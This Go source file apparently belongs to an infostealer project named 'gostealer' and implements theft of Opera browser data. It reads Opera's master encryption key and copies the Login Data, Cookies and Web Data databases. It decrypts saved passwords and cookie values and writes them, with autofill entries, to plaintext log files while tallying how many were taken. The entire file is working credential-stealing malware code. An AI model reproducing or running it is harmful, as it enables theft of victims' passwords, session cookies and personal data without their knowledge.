package browsers

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
	"github.com/4kord/gostealer/utils/decrypt"
)

func Opera(browserPath, logFolderPath string) {
	browserKey := decrypt.GetBrowserEncryptedKey(browserPath)

	err := os.WriteFile(path.Join(logFolderPath, "raw", "opera_masterkey.txt"), browserKey, 0644)
	if err != nil {
		log.Println(err)
	}

	browserPasswords := getOperaPasswords(browserPath, logFolderPath, browserKey)
	browserCookies := getOperaCookies(browserPath, logFolderPath, browserKey)
	browserAutofill := getOperaAutofill(browserPath, logFolderPath)

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Opera", "Passwords.txt"), []byte(browserPasswords), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Opera", "Cookies.txt"), []byte(browserCookies), 0644)
	if err != nil {
		log.Println(err)
	}

	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Opera", "Autofill.txt"), []byte(browserAutofill), 0644)
	if err != nil {
		log.Println(err)
	}

}

func getOperaPasswords(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Login Data"), path.Join(logFolderPath, "raw", "opera_login_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	sqllitePath := path.Join(logFolderPath, "raw", "opera_login_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		entry := PasswordEntry{}
		err := rows.Scan(&entry.OriginUrl, &entry.Username, &entry.Password)
		if err != nil {
			log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
			return ""
		}

		entry.Password = decrypt.DecryptWithKey(key, []byte(entry.Password))
		data += fmt.Sprintf("URL: %s | Username: %s | Password: %s\n", entry.OriginUrl, entry.Username, entry.Password)
		utils.PasswordAmount++
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	return data
}

func getOperaCookies(browserPath, logFolderPath string, key []byte) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Network", "Cookies"), path.Join(logFolderPath, "raw", "opera_cookies"))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	sqllitePath := path.Join(logFolderPath, "raw", "opera_cookies")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	rows, err := db.Query("SELECT host_key, path, expires_utc, name, encrypted_value FROM cookies")
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		entry := CookieEntry{}
		err := rows.Scan(&entry.Host, &entry.Path, &entry.Expiry, &entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
			return ""
		}

		entry.Value = decrypt.DecryptWithKey(key, []byte(entry.Value))
		data += fmt.Sprintf("Host: %s | Path: %s | Expiry: %d | Name: %s | Value: %s\n", entry.Host, entry.Path, entry.Expiry, entry.Name, entry.Value)
		utils.CookieAmount++
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	return data
}

func getOperaAutofill(browserPath, logFolderPath string) string {
	_, err := utils.CopyFile(path.Join(browserPath, "Web Data"), path.Join(logFolderPath, "raw", "opera_web_data"))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	sqllitePath := path.Join(logFolderPath, "raw", "opera_web_data")

	var data string

	db, err := sql.Open("sqlite", fmt.Sprintf("file:%s", sqllitePath))
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	rows, err := db.Query("SELECT name, value FROM autofill")
	if err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}
	defer rows.Close()

	for rows.Next() {
		entry := AutofillEntry{}
		err := rows.Scan(&entry.Name, &entry.Value)
		if err != nil {
			log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
			return ""
		}

		data += fmt.Sprintf("Name: %s | Value: %s\n", entry.Name, entry.Value)
		utils.AutofillAmount++
	}
	if err := rows.Err(); err != nil {
		log.Println(fmt.Sprintf("[OPERA] %s", err.Error()))
		return ""
	}

	return data
}
